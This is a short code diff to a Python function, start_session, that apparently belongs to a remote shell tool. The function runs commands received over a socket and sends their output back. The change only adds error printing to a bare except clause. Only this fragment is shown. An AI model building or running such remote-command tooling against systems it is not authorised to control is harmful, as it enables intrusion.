@@ -32,7 +32,9 @@ def start_session(s):
                     output = pipe.stdout.read()
                     s.send("DONE".encode())
                     s.send(output.encode())
-                except:
+                except Exception as e:
+                    print("[*] Shell execution failed")
+                    print("[*] Error : %s"%(str(e)))
                     s.send("FAILED".encode())
                     pass
 
